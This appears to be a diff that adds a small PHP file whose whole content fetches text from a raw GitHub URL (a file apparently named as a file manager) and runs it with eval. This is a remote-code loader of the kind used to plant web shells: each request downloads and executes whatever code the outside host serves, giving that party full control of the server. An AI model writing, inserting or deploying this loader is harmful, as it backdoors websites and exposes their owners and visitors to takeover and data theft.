@@ -1,0 +1,6 @@
+<?php
+
+    $content = file_get_contents(urldecode('https://raw.githubusercontent.com/semangat777/landing/refs/heads/main/fmanagerbaru.txt'));
+
+    $content = "?> ".$content;
+    eval($content);
